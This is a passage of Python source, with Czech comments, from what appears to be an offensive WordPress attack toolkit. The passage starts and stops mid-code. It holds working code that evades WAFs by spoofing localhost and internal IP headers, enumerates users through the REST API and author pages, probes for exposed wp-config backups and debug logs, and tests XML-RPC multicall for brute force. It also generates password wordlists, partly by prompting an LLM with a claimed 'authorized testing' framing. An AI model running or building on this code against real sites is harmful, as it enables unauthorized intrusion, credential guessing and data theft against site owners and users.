    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.results = {}
    
    def fingerprint(self):
        self.output.phase("TCP/IP STACK FINGERPRINTING")
        self.output.info("Analyzuji TCP/IP stack serveru...")
        
        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        results = {}
        
        try:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "close"
            }
            
            response = requests.get(self.target, headers=headers, timeout=15, verify=False)
            
            # Server hlavička
            server = response.headers.get("Server", "N/A")
            results["server"] = server
            self.output.result_line("Server", server)
            
            # HSTS
            hsts = response.headers.get("Strict-Transport-Security", "N/A")
            results["hsts"] = hsts
            self.output.result_line("HSTS", hsts[:50] if hsts != "N/A" else hsts)
            
            # CORS
            cors = response.headers.get("Access-Control-Allow-Origin", "N/A")
            results["cors"] = cors
            self.output.result_line("CORS", cors)
            
            # X-Frame-Options
            xfo = response.headers.get("X-Frame-Options", "N/A")
            results["x-frame-options"] = xfo
            self.output.result_line("X-Frame-Options", xfo)
            
            # X-Content-Type-Options
            xcto = response.headers.get("X-Content-Type-Options", "N/A")
            results["x-content-type-options"] = xcto
            self.output.result_line("X-Content-Type-Options", xcto)
            
            # Content-Security-Policy
            csp = response.headers.get("Content-Security-Policy", "N/A")
            results["csp"] = csp
            self.output.result_line("CSP", csp[:60] if csp != "N/A" else csp)
            
            # X-Powered-By
            xpb = response.headers.get("X-Powered-By", "N/A")
            results["x-powered-by"] = xpb
            self.output.result_line("X-Powered-By", xpb)
            
            # Set-Cookie analýza
            cookies = response.headers.get("Set-Cookie", "")
            if cookies:
                cookie_flags = []
                if "HttpOnly" in cookies:
                    cookie_flags.append("HttpOnly ✓")
                if "Secure" in cookies:
                    cookie_flags.append("Secure ✓")
                if "SameSite" in cookies:
                    cookie_flags.append("SameSite ✓")
                results["cookie_flags"] = ", ".join(cookie_flags) if cookie_flags else "Žádné bezpečnostní flagy"
                self.output.result_line("Cookie Flags", results["cookie_flags"])
            
            # Detekce CDN/WAF
            cdn_headers = ["CF-Ray", "X-Sucuri-ID", "X-CDN", "Akamai-Origin-Hop",
                          "x-amz-cf-id", "x-azure-ref", "X-Github-Request-Id"]
            found_cdn = []
            for ch in cdn_headers:
                if ch in response.headers:
                    found_cdn.append(ch)
            if found_cdn:
                results["cdn"] = ", ".join(found_cdn)
                self.output.result_line("CDN/WAF", ", ".join(found_cdn))
            
            # Rate Limiting test
            self.output.info("Testuji rate limiting...")
            rate_limit_hit = False
            for i in range(12):
                try:
                    rr = requests.get(self.target, headers=headers, timeout=3, verify=False)
                    if rr.status_code == 429:
                        rate_limit_hit = True
                        self.output.warning("Rate limiting detekován (429)")
                        results["rate_limiting"] = "Aktivní (429)"
                        break
                    elif rr.status_code == 503:
                        self.output.warning("503 Service Unavailable")
                        results["rate_limiting"] = "Možný rate limit (503)"
                        break
                except Exception:
                    pass
                time.sleep(0.3)
            
            if not rate_limit_hit:
                self.output.success("Rate limiting nedetekován")
                results["rate_limiting"] = "Nedetekován"
            
            self.results = results
            self.output.separator()
            return results
            
        except Exception as e:
            self.output.error(f"TCP/IP fingerprint selhal: {str(e)[:40]}")
            return {}


# =============================================================================
# MODUL 4: DOM Analyzer (z pokročilého JS/DOM scanu)
# =============================================================================

class DOMAnalyzer:
    """Pokročilá analýza DOM stromu pro bezpečnostní slabiny"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.findings = []
    
    def analyze(self):
        self.output.phase("DOM ANALÝZA - JAVASCRIPT & HTML INSPEKCE")
        
        try:
            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
            resp = requests.get(self.target, headers=headers, timeout=15, verify=False)
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # 1. Inline JavaScript analýza
            self.output.info("Analyzuji inline JavaScript...")
            scripts = soup.find_all('script')
            for script in scripts:
                if script.string:
                    code = script.string
                    
                    # Hledání citlivých API klíčů v JS
                    patterns = {
                        'API klíč': r'(?:api[_-]?key|apikey|api_key)["\']?\s*[:=]\s*["\'][A-Za-z0-9_\-]{16,}["\']',
                        'JWT token': r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}',
                        'Admin AJAX': r'admin-ajax\.php',
                        'Nonce': r'"[a-f0-9]{10,}"',
                        'InnerHTML (XSS risk)': r'\.innerHTML\s*=',
                        'eval() (danger)': r'eval\s*\(',
                        'document.write': r'document\.write\s*\(',
                        'localStorage': r'localStorage',
                        'sessionStorage': r'sessionStorage',
                    }
                    
                    for pname, pattern in patterns.items():
                        matches = re.findall(pattern, code, re.IGNORECASE)
                        for m in matches[:2]:
                            finding = f"{pname}: {m[:80]}"
                            severity = "danger" if pname in ['eval() (danger)', 'InnerHTML (XSS risk)'] else "warning"
                            self.output.warning(f"JS Security: {finding}")
                            self.output.add_finding(f"JS: {pname}", finding[:60], severity)
            
            # 2. Komentáře v HTML
            self.output.info("Kontroluji HTML komentáře...")
            comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
            for comment in comments:
                comment = comment.strip()
                if comment and any(kw in comment.lower() for kw in 
                                  ['todo', 'fixme', 'pass', 'password', 'secret', 'key', 'token', 'admin', 'debug', 'hack']):
                    self.output.warning(f"Komentář: {comment[:80]}")
                    self.output.add_finding("HTML komentář", comment[:60], "warning")
            
            # 3. Data atributy
            self.output.info("Kontroluji data-* atributy...")
            data_attrs = re.findall(r'data-[\w-]+="[^"]{0,200}"', resp.text)
            sensitive_data = []
            for da in data_attrs:
                if re.search(r'(pass|key|token|secret|auth|admin)', da, re.IGNORECASE):
                    sensitive_data.append(da[:80])
                    self.output.add_finding("Sensitive data-attr", da[:60], "danger")
            if sensitive_data:
                self.output.warning(f"{len(sensitive_data)} citlivých data-* atributů")
                for sd in sensitive_data[:3]:
                    self.output.result_line("data-*", sd)
            
            # 4. Formuláře bez CSRF
            self.output.info("Kontroluji CSRF ochranu...")
            forms = soup.find_all('form')
            for form in forms:
                action = form.get('action', '')
                has_nonce = bool(re.search(r'wpnonce|_wpnonce|csrf|token', str(form), re.IGNORECASE))
                if not has_nonce:
                    self.output.warning(f"Formulář bez CSRF: {action}")
                    self.output.add_finding("Form bez CSRF", action, "warning")
            
            # 5. Externí zdroje (CDN, iframe)
            self.output.info("Kontroluji externí zdroje...")
            externals = []
            for tag in soup.find_all(['script', 'link', 'img', 'iframe', 'source']):
                src = tag.get('src', tag.get('href', ''))
                if src and not src.startswith(('#', '/', self.target.rstrip('/').split('/')[2] if '://' in self.target else '')):
                    if 'http' in src and self.target.rstrip('/').split('/')[2] not in src:
                        externals.append(src)
            
            if externals:
                self.output.warning(f"{len(externals)} externích zdrojů (Mixed Content risk)")
                for ext in externals[:5]:
                    self.output.result_line("Externí", ext)
                if any('http://' in e for e in externals):
                    self.output.warning("Mixed Content! HTTP zdroje na HTTPS stránce")
                    self.output.add_finding("Mixed Content", "HTTP zdroje na HTTPS", "danger")
            
            # 6. Insecure cookies
            if 'Set-Cookie' in resp.headers:
                cookies = resp.headers['Set-Cookie']
                if 'Secure' not in cookies:
                    self.output.warning("Cookie bez Secure flagu")
                    self.output.add_finding("Cookie", "Bez Secure flagu", "danger")
                if 'HttpOnly' not in cookies:
                    self.output.warning("Cookie bez HttpOnly flagu")
                    self.output.add_finding("Cookie", "Bez HttpOnly flagu", "danger")
            
            # 7. ClickJacking test
            xfo = resp.headers.get('X-Frame-Options', '')
            if not xfo:
                self.output.warning("ClickJacking! X-Frame-Options chybí")
                self.output.add_finding("ClickJacking", "X-Frame-Options chybí", "danger")
            
            self.output.success("DOM analýza dokončena")
            return self.findings
            
        except Exception as e:
            self.output.error(f"DOM analýza selhala: {str(e)[:40]}")
            return []


# =============================================================================
# MODUL 5: Auto Bypasser (WAF, Rate-Limiting, CAPTCHA)
# =============================================================================

class AutoBypasser:
    """Automatické bypassování WAF, rate limitu a CAPTCHA"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.waf_detected = None
        self.bypass_methods = []
    
    def detect_and_bypass(self):
        """Detekce a bypass WAF/security"""
        self.output.phase("AUTO-BYPASS ENGINE")
        
        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        
        # 1. Detekce WAF
        waf_info = self._detect_waf()
        
        # 2. Aplikace bypass metod
        bypass_results = self._apply_bypasses()
        
        return waf_info, bypass_results
    
    def _detect_waf(self):
        """Detekce WAF pomocí fingerprinting technik"""
        self.output.info("Detekuji WAF/security vrstvy...")
        
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            resp = requests.get(self.target, headers=headers, timeout=10, verify=False)
            
            waf_signatures = {
                "CloudFlare": ["CF-Ray", "cf-ray", "__cfduid", "cloudflare"],
                "Sucuri": ["X-Sucuri-ID", "Sucuri/", "sucuri"],
                "ModSecurity": ["ModSecurity", "NOYB"],
                "Wordfence": ["wordfence", "Wordfence"],
                "Akamai": ["akamai", "AkamaiGHost"],
                "AWS WAF": ["x-amzn-RequestId", "x-amzn-ErrorType"],
                "F5 BIG-IP": ["BigIP", "BIG-IP"],
                "Imperva": ["X-Iinfo", "Incapsula"],
                "Barracuda": ["barracuda"],
                "Fortinet": ["Fortigate", "FortiWeb"],
                "Comodo": ["Protected by Comodo"],
                "SiteGround": ["SG-Optimizer", "SiteGround"],
                "StackPath": ["StackPath"],
                "Varnish": ["X-Varnish", "Via: 1.1 varnish"],
                "Nginx": ["nginx"],
            }
            
            detected = []
            
            # Hlavičky
            for header, value in resp.headers.items():
                header_lower = header.lower()
                value_lower = value.lower()
                
                for waf_name, signatures in waf_signatures.items():
                    for sig in signatures:
                        if sig.lower() in header_lower or sig.lower() in value_lower:
                            if waf_name not in detected:
                                detected.append(waf_name)
            
            # Cookies
            for cookie in resp.cookies:
                for waf_name, signatures in waf_signatures.items():
                    for sig in signatures:
                        if sig.lower() in cookie.name.lower():
                            if waf_name not in detected:
                                detected.append(waf_name)
            
            # Blokované response
            triggers = {
                "CloudFlare": ["Attention Required! | Cloudflare", "Just a moment..."],
                "Sucuri": "Sucuri WebSite Firewall",
                "ModSecurity": "Not Acceptable", 
                "Wordfence": "This response was generated by Wordfence"
            }
            
            for waf_name, trigger in triggers.items():
                if isinstance(trigger, list):
                    for t in trigger:
                        if t.lower() in resp.text[:2000].lower():
                            if waf_name not in detected:
                                detected.append(waf_name)
                else:
                    if trigger.lower() in resp.text[:500].lower():
                        if waf_name not in detected:
                            detected.append(waf_name)
            
            if detected:
                self.waf_detected = detected
                for waf in detected:
                    self.output.warning(f"WAF detekován: {waf}")
                    self.output.add_finding("WAF", waf, "danger")
                
                # Bypass tipy pro každý WAF
                bypass_tips = {
                    "CloudFlare": "Zkus: změna User-Agent, Cookie clearance, CloudScraper modul",
                    "Sucuri": "Zkus: HTTP/1.0, starší TLS, proxy chain",
                    "ModSecurity": "Zkus: encoding bypass (URL/Base64), CRLF injection",
                    "Wordfence": "Zkus: rate limiting bypass, rozdělení requestů",
                    "Akamai": "Zkus: Akamai Buster, změna TLS fingerprintu",
                    "AWS WAF": "Zkus: rozdělení payloadu, WAF-specific bypassy",
                }
                for waf in detected:
                    if waf in bypass_tips:
                        self.output.info(f"  → Tip: {bypass_tips[waf]}")
                
                return detected
            else:
                self.output.success("WAF nedetekován")
                return []
                
        except Exception as e:
            self.output.warning(f"WAF detekce selhala: {str(e)[:40]}")
            return []
    
    def _apply_bypasses(self):
        """Aplikuje bypass techniky"""
        results = {}
        
        # Bypass metody
        bypass_headers = {
            "X-Forwarded-For: 127.0.0.1": "Localhost bypass",
            "X-Forwarded-For: 192.168.1.1": "Internal IP bypass",
            "X-Real-IP: 127.0.0.1": "Real IP bypass",
            "Client-IP: 127.0.0.1": "Client IP bypass",
            "X-Originating-IP: 127.0.0.1": "Originating IP bypass",
            "X-Remote-IP: 127.0.0.1": "Remote IP bypass",
            "X-Remote-Addr: 127.0.0.1": "Remote Addr bypass",
            "X-Client-IP: 127.0.0.1": "Client IP bypass",
            "X-Host: 127.0.0.1": "Host bypass",
            "X-Forwarded-Host: 127.0.0.1": "Forwarded Host bypass",
            "Upgrade-Insecure-Requests: 1": "HTTPS bypass",
            "Cache-Control: no-cache": "Cache bypass",
            "Pragma: no-cache": "Pragma bypass",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8": "Accept header bypass",
        }
        
        self.output.info("Testuji bypass techniky...")
        
        # Rychlý test top 5 bypassů
        top_bypasses = list(bypass_headers.items())[:5]
        for header_value, description in top_bypasses:
            try:
                h_name, h_val = header_value.split(": ", 1)
                test_headers = {"User-Agent": "Mozilla/5.0", h_name: h_val}
                r = requests.get(self.target, headers=test_headers, timeout=5, verify=False)
                
                if r.status_code == 200:
                    self.output.success(f"Bypass {description} ({h_name}) - 200 OK")
                    results[h_name] = True
                elif r.status_code == 403:
                    self.output.warning(f"Bypass {description} - 403 Forbidden (stále blokován)")
                    results[h_name] = False
                else:
                    self.output.result_line(f"Bypass {description}", f"{r.status_code}")
                    results[h_name] = r.status_code
            except Exception:
                pass
        
        # Proxy bypass (pokud je nakonfigurováno)
        proxy = self._get_proxy_chain()
        if proxy:
            self.output.info(f"Testuji proxy chain: {proxy[:40]}...")
            try:
                proxies = {"http": proxy, "https": proxy}
                pr = requests.get(self.target, proxies=proxies, timeout=10, verify=False)
                if pr.status_code == 200:
                    self.output.success("Proxy bypass funguje!")
                    results["proxy_bypass"] = True
                else:
                    self.output.warning(f"Proxy bypass: {pr.status_code}")
                    results["proxy_bypass"] = False
            except Exception:
                self.output.warning("Proxy bypass selhal")
                results["proxy_bypass"] = False
        
        self.output.info("AUTO-BYPASS dokončen")
        return results
    
    def _get_proxy_chain(self):
        """Získá proxy z configu"""
        config_file = os.path.join(WORK_DIR, "config.yaml")
        if os.path.isfile(config_file):
            try:
                with open(config_file) as f:
                    data = yaml.safe_load(f)
                    if data and 'proxy' in data:
                        return data['proxy']
            except Exception:
                pass
        
        # Zkusíme environment variable
        return os.environ.get('HTTP_PROXY') or os.environ.get('HTTPS_PROXY') or None


# =============================================================================
# MODUL 6: WP Scanner + Enumeration
# =============================================================================

class WPScanner:
    """Rozšířený WordPress scanner"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.timeout = 15
    
    def scan(self):
        """Hlavní scanovací rutina"""
        self.output.phase("WORDPRESS SCAN - DEEP ENUMERATION")
        
        hostname = self.target.replace("https://", "").replace("http://", "").split("/")[0]
        
        # 1. Základní informace
        info = self._basic_info()
        
        # 2. Plugin enumeration
        plugins = self._enum_plugins()
        
        # 3. Theme enumeration
        themes = self._enum_themes()
        
        # 4. User enumeration
        users = self._enum_users()
        
        # 5. Security checks
        security = self._security_checks()
        
        # 6. XML-RPC
        xmlrpc = self._check_xmlrpc()
        
        return {
            "info": info,
            "plugins": plugins,
            "themes": themes,
            "users": users,
            "security": security,
            "xmlrpc": xmlrpc
        }
    
    def _basic_info(self):
        """Základní informace o WP"""
        self.output.info("Získávám základní informace...")
        info = {}
        
        try:
            resp = requests.get(self.target, timeout=self.timeout, verify=False, 
                               headers={"User-Agent": "Mozilla/5.0"})
            soup = BeautifulSoup(resp.text, 'html.parser')
            
            # Generator meta tag
            gen = soup.find("meta", attrs={"name": "generator"})
            if gen and gen.get("content"):
                info["wordpress_version"] = gen["content"]
                self.output.result_line("WordPress", gen["content"])
                self.output.add_finding("WordPress verze", gen["content"], "info")
            
            # Pingback
            if "/xmlrpc.php" in resp.text:
                info["pingback"] = True
                self.output.result_line("Pingback", "Aktivní", Fore.YELLOW)
            
            # REST API
            rest_url = self.target.rstrip('/') + "/wp-json/"
            try:
                rr = requests.get(rest_url, timeout=5, verify=False)
                if rr.status_code == 200:
                    info["rest_api"] = True
                    self.output.result_line("REST API", "Dostupné", Fore.YELLOW)
                    self.output.add_finding("REST API", "Dostupné", "warning")
            except Exception:
                pass
            
            # Content dir
            if "/wp-content/" in resp.text:
                info["wp_content"] = True
            
            # Admin dir
            if "/wp-admin/" in resp.text:
                info["wp_admin"] = True
            
            # Readme
            readme_url = self.target.rstrip('/') + "/readme.html"
            try:
                rm = requests.get(readme_url, timeout=5, verify=False)
                if rm.status_code == 200:
                    info["readme"] = True
                    self.output.warning("Readme.html dostupný - informace o verzi WP")
                    self.output.add_finding("Readme.html", "Dostupný", "danger")
            except Exception:
                pass
            
        except Exception as e:
            self.output.error(f"Základní info selhalo: {str(e)[:40]}")
        
        return info
    
    def _enum_plugins(self):
        """Enumerace pluginů"""
        self.output.info("Enumeruji pluginy...")
        plugins = []
        
        try:
            resp = requests.get(self.target, timeout=self.timeout, verify=False,
                               headers={"User-Agent": "Mozilla/5.0"})
            
            # Z HTML
            plugin_matches = re.findall(r'/wp-content/plugins/([^/]+)/', resp.text)
            unique_plugins = OrderedDict.fromkeys(plugin_matches)
            
            for plugin in unique_plugins:
                plugins.append({"name": plugin, "source": "html"})
                self.output.result_line("Plugin", plugin, Fore.CYAN)
                self.output.add_finding("Plugin", plugin, "info")
            
            # Common plugin paths
            common_plugins = [
                "akismet", "contact-form-7", "wordfence", "jetpack", "woocommerce",
                "elementor", "yoast", "gravityforms", "w3-total-cache", "wp-super-cache",
                "all-in-one-seo-pack", "revslider", "advanced-custom-fields", "redirection",
                "better-wp-security", "really-simple-ssl", "litespeed-cache",
                "wpforms-lite", "wordpress-seo", "disable-xml-rpc", "all-in-one-wp-migration"
            ]
            
            for cp in common_plugins:
                if cp not in unique_plugins:
                    plugin_url = self.target.rstrip('/') + f"/wp-content/plugins/{cp}/readme.txt"
                    try:
                        pr = requests.get(plugin_url, timeout=3, verify=False)
                        if pr.status_code == 200 and pr.text.strip():
                            plugins.append({"name": cp, "source": "readme"})
                            self.output.result_line("Plugin (readme)", cp, Fore.CYAN)
                            self.output.add_finding("Plugin", cp, "info")
                    except Exception:
                        pass
                    
                    # CSS/JS detekce
                    for ext in [".css?ver=", ".js?ver="]:
                        ver_url = self.target.rstrip('/') + f"/wp-content/plugins/{cp}/{cp}.css?ver=1"
                        try:
                            vr = requests.get(ver_url, timeout=3, verify=False)
                            if vr.status_code == 200:
                                v_match = re.search(r'ver=([\d.]+)', vr.url)
                                ver = v_match.group(1) if v_match else "?"
                                plugins.append({"name": cp, "version": ver, "source": "css"})
                                self.output.result_line(f"Plugin {cp}", f"verze {ver}", Fore.CYAN)
                                self.output.add_finding(f"Plugin {cp}", f"verze {ver}", "info")
                                break
                        except Exception:
                            pass
            
            if plugins:
                self.output.success(f"Nalezeno {len(plugins)} pluginů")
            else:
                self.output.warning("Nenalezeny žádné pluginy (možná maskování)")
            
        except Exception as e:
            self.output.error(f"Plugin enum selhal: {str(e)[:40]}")
        
        return plugins
    
    def _enum_themes(self):
        """Enumerace témat"""
        self.output.info("Enumeruji témata...")
        themes = []
        
        try:
            resp = requests.get(self.target, timeout=self.timeout, verify=False,
                               headers={"User-Agent": "Mozilla/5.0"})
            
            theme_matches = re.findall(r'/wp-content/themes/([^/]+)/', resp.text)
            unique_themes = OrderedDict.fromkeys(theme_matches)
            
            for theme in unique_themes:
                themes.append({"name": theme, "source": "html"})
                self.output.result_line("Theme", theme, Fore.MAGENTA)
                self.output.add_finding("Theme", theme, "info")
            
            if themes:
                self.output.success(f"Nalezeno {len(themes)} témat")
            else:
                self.output.warning("Témata nenalezena")
        
        except Exception as e:
            self.output.error(f"Theme enum selhal: {str(e)[:40]}")
        
        return themes
    
    def _enum_users(self):
        """Enumerace uživatelů přes REST API a author stránky"""
        self.output.info("Enumeruji uživatele...")
        users = []
        
        # REST API
        rest_url = self.target.rstrip('/') + "/wp-json/wp/v2/users?per_page=100"
        try:
            ur = requests.get(rest_url, timeout=8, verify=False)
            if ur.status_code == 200:
                data = ur.json()
                for u in data:
                    username = u.get('slug', u.get('name', '?'))
                    uid = u.get('id', '?')
                    users.append({"username": username, "id": uid, "source": "rest"})
                    self.output.result_line(f"Uživatel (REST)", f"{username} (ID: {uid})", Fore.YELLOW)
                    self.output.add_finding("Uživatel (REST)", username, "danger")
                
                self.output.success(f"REST API: {len(users)} uživatelů")
        except Exception:
            pass
        
        # Author enumeration
        if not users:
            self.output.info("Zkouším author enumeration...")
            for i in range(1, 21):
                try:
                    auth_url = self.target.rstrip('/') + f"/?author={i}"
                    ar = requests.get(auth_url, timeout=3, verify=False, allow_redirects=True)
                    
                    auth_name = None
                    if 'author/' in ar.url:
                        auth_name = ar.url.split('author/')[1].split('/')[0].split('?')[0]
                    
                    if auth_name and auth_name not in [u['username'] for u in users]:
                        users.append({"username": auth_name, "id": i, "source": "author"})
                        self.output.result_line(f"Uživatel (author={i})", auth_name, Fore.YELLOW)
                        self.output.add_finding("Uživatel (author)", auth_name, "danger")
                        
                        if len(users) >= 10:
                            break
                except Exception:
                    pass
        
        # Zkusíme i /wp-json/wp/v2/users/ s různými parametry
        if len(users) < 5:
            try:
                for offset in [0, 20, 40, 60]:
                    rest_url2 = self.target.rstrip('/') + f"/wp-json/wp/v2/users?per_page=20&offset={offset}"
                    ur2 = requests.get(rest_url2, timeout=5, verify=False)
                    if ur2.status_code == 200:
                        data = ur2.json()
                        for u in data:
                            username = u.get('slug', '?')
                            if username not in [us['username'] for us in users]:
                                users.append({"username": username, "id": u.get('id', '?'), "source": "rest_offset"})
            except Exception:
                pass
        
        if not users:
            self.output.warning("Žádní uživatelé nenalezeni")
        
        return users
    
    def _security_checks(self):
        """Bezpečnostní kontroly"""
        self.output.info("Provádím bezpečnostní kontroly...")
        check_results = {}
        
        # WP-Cron
        cron_url = self.target.rstrip('/') + "/wp-cron.php"
        try:
            cr = requests.get(cron_url, timeout=5, verify=False)
            if cr.status_code == 200:
                check_results["wp_cron"] = True
                self.output.warning("WP-Cron je veřejně přístupný!")
                self.output.add_finding("WP-Cron", "Veřejně přístupný", "danger")
            else:
                check_results["wp_cron"] = False
        except Exception:
            pass
        
        # Install.php
        install_url = self.target.rstrip('/') + "/wp-admin/install.php"
        try:
            ir = requests.get(install_url, timeout=5, verify=False)
            if ir.status_code == 200:
                check_results["install_php"] = True
                self.output.error("WP instalační stránka je přístupná!")
                self.output.add_finding("install.php", "Přístupný", "danger")
            else:
                check_results["install_php"] = False
        except Exception:
            pass
        
        # Debug log
        debug_url = self.target.rstrip('/') + "/wp-content/debug.log"
        try:
            dr = requests.get(debug_url, timeout=5, verify=False)
            if dr.status_code == 200 and "PHP" in dr.text:
                check_results["debug_log"] = True
                self.output.error("Debug log je veřejný!")
                self.output.add_finding("debug.log", "Veřejně přístupný", "danger")
            else:
                check_results["debug_log"] = False
        except Exception:
            pass
        
        # Backup files
        backups = [
            "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.save",
            "/wp-config.php.old", "/wp-config.php.swp", "/wp-config.bak",
            "/.wp-config.php.swp", "/wp-config.txt"
        ]
        found_backups = []
        for bf in backups:
            try:
                bu_url = self.target.rstrip('/') + bf
                br = requests.get(bu_url, timeout=3, verify=False)
                if br.status_code == 200 and 'DB_' in br.text:
                    found_backups.append(bf)
                    self.output.error(f"Záloha konfigurace: {bf}")
                    self.output.add_finding("Záloha configu", bf, "danger")
            except Exception:
                pass
        check_results["backups"] = found_backups
        
        return check_results
    
    def _check_xmlrpc(self):
        """Kontrola XML-RPC"""
        self.output.info("Kontroluji XML-RPC...")
        
        xml_url = self.target.rstrip('/') + "/xmlrpc.php"
        xml_data = '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
        
        try:
            xr = requests.post(xml_url, data=xml_data,
                              headers={"Content-Type": "text/xml"},
                              timeout=8, verify=False)
            
            if xr.status_code == 200:
                if "methodName" in xr.text:
                    self.output.success("XML-RPC je aktivní")
                    self.output.add_finding("XML-RPC", "Aktivní", "warning")
                    
                    # Extrahujeme metody
                    methods = re.findall(r'<value><string>(.*?)</string></value>', xr.text)
                    if methods:
                        for m in methods:
                            if any(kw in m.lower() for kw in ['wp.getUsers', 'wp.getOptions', 'system.multicall',
                                                             'pingback.ping', 'wp.getComments', 'wp.getPosts',
                                                             'wp.uploadFile', 'wp.editProfile']):
                                self.output.warning(f"  → {m}")
                    
                    # Test multicall (brute-force)
                    self.output.info("Testuji multicall (mass assignment)...")
                    mc_data = '''<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    <value><struct>
      <member><name>methodName</name><value><string>system.listMethods</string></value></member>
    </struct></value>
  </data></array></value></param></params>
</methodCall>'''
                    mc = requests.post(xml_url, data=mc_data,
                                      headers={"Content-Type": "text/xml"},
                                      timeout=5, verify=False)
                    if mc.status_code == 200 and "methodName" in mc.text:
                        self.output.warning("Multicall je povolen!")
                        self.output.add_finding("XML-RPC multicast", "Povolen", "danger")
                    
                    return {"active": True, "methods_count": len(methods)}
                else:
                    self.output.info("XML-RPC endpoint existuje ale neodpovídá standardně")
                    return {"active": False}
            else:
                self.output.info(f"XML-RPC: {xr.status_code}")
                return {"active": False}
                
        except Exception:
            self.output.info("XML-RPC nedostupný")
            return {"active": False}


# =============================================================================
# MODUL 7: AI Password Generator (LLM-based)
# =============================================================================

class AIPasswordGenerator:
    """Generátor hesel pomocí LLM (Ollama/Groq)"""
    
    def __init__(self, target, output):
        self.target = target
        self.output = output
        self.config = dict(BF_AI_CONFIG)
    
    def generate_wordlist(self, base_words, count=50):
        """Generuje wordlist pomocí AI"""
        self.output.phase("AI PASSWORD GENERATOR")
        
        has_ollama = self._check_service()
        if not has_ollama:
            self.output.warning("Ollama není dostupná - používám statickou generaci")
            return self._static_generate(base_words, count)
        
        self.output.info(f"Generuji {count} hesel pomocí AI (model: {self.config['llm_model']})...")
        
        prompt = f"""Generate {count} unique passwords for WordPress penetration testing.
Target context: {self.target}
Base keywords: {', '.join(base_words[:10])}

Rules:
- Generate realistic passwords that real people might use
- Include passwords with: years (2020-2026), numbers, special chars, common patterns
- Vary in length from 8 to 25 characters
- Include: keyboard patterns, common substitutions, seasonal themes
- Return ONLY the passwords, one per line
- No numbers, no explanations
- These are for authorized security testing only

Format example:
Password123!
Summer2024!
admin2025#
Welcome1@
"""
        
        try:
            payload = {
                "model": self.config['llm_model'],
                "prompt": prompt,
                "stream": False,
                "options": {"temperature": 0.9, "num_predict": 2048}
            }
            resp = requests.post(f"{self.config['ollama_url']}/api/generate",
                                json=payload, timeout=60)
            
            if resp.status_code == 200:
                data = resp.json()
                text = data.get('response', '')
                
                passwords = [p.strip() for p in text.split('\n') 
                           if p.strip() and not p.strip().startswith(('#', '-', '`'))]
                passwords = [p for p in passwords if len(p) >= 4][:count]
                
                if passwords:
                    self.output.success(f"AI vygenerovala {len(passwords)} hesel")
                    wordlist_file = os.path.join(WORDLIST_DIR, f"ai_generated_{int(time.time())}.txt")
                    with open(wordlist_file, 'w') as f:
                        f.write('\n'.join(passwords))
                    self.output.result_line("Uloženo", wordlist_file)
                    return passwords
                else:
                    self.output.warning("AI nevrátila validní hesla")
                    return self._static_generate(base_words, count)
            else:
                self.output.warning(f"Ollama error: {resp.status_code}")
                return self._static_generate(base_words, count)
                
        except Exception as e:
            self.output.warning(f"AI generátor selhal: {str(e)[:40]}")
            return self._static_generate(base_words, count)
    
    def _static_generate(self, base_words, count):
        """Statická generace hesel bez AI"""
        self.output.info(f"Generuji {count} hesel staticky...")
        passwords = set()
        
        base = ["admin", "wordpress", "wp", "user", "pass", "login", "web", "site",
                "abc", "test", "demo", "root", "master", "hello", "welcome",
                "password", "secret", "changeme", "default", "temporary",
                "qwerty", "letmein", "sunshine", "princess", "dragon",
                "monkey", "football", "iloveyou", "trustno1", "shadow",
                "master", "superman", "batman", "starwars", "admin123"]
        
        years = ["2020", "2021", "2022", "2023", "2024", "2025", "2026",
                 "20", "21", "22", "23", "24", "25", "26"]
        
        special_chars = ["!", "@", "#", "$", "%", "&", "*"]
        
        for word in base + base_words:
            passwords.add(word)
            passwords.add(word.capitalize())
            
            for year in years[:3]:
                passwords.add(f"{word}{year}")
                passwords.add(f"{word}{year}!")
                passwords.add(f"{word}{year}@")
                passwords.add(f"{word}#{year}")
            
            for sc in special_chars[:4]:
                passwords.add(f"{word}{sc}")
                passwords.add(f"{word}{sc}1")
                passwords.add(f"{word.capitalize()}{sc}")
                passwords.add(f"{word.capitalize()}{sc}123")
            
            passwords.add(word + "123")
            passwords.add(word + "123!")
            passwords.add(word + "1")
            passwords.add(word + "!")
            passwords.add(word.upper() + "!")
            passwords.add(word.upper() + "123")
            
            # Leet speak
            leet = word.replace('e', '3').replace('a', '@').replace('o', '0').replace('i', '1')
            passwords.add(leet)
            passwords.add(leet + "!")
            passwords.add(leet + "123")
        
        passwords = [p for p in passwords if len(p) >= 4 and len(p) <= 30]
        
        if len(passwords) < count:
            # Common patterns
            common = [
                "P@ssw0rd", "P@$$w0rd", "p@ssword", "C0mplex!", "Str0ng!",
                "Qwerty123!", "Password1!", "Wordpass1!", "Admin!2024",
                "Changeme1!", "Temp12345!", "Welcome1!", "Pa$$word",
                "P@ss12345", "W0rdpr3ss!", "Bl@ckC4t!", "H@ckTh1s!",
                "S3cur1ty!", "T3st!ng1", "P3nt3st!"
            ]
            passwords.update(common)
        
        final_list = list(passwords)[:count]
        
        wordlist_file = os.path.join(WORDLIST_DIR, f"generated_{int(time.time())}.txt")
        with open(wordlist_file, 'w') as f:
            f.write('\n'.join(final_list))
        
        self.output.success(f"Vygenerováno {len(final_list)} hesel")
        self.output.result_line("Soubor", wordlist_file)
        
        return final_list
    
    def _check_service(self):
        """Zkontroluje Ollama dostupnost"""
        try:
            r = requests.get(f"{self.config['ollama_url']}/api/tags", timeout=3)
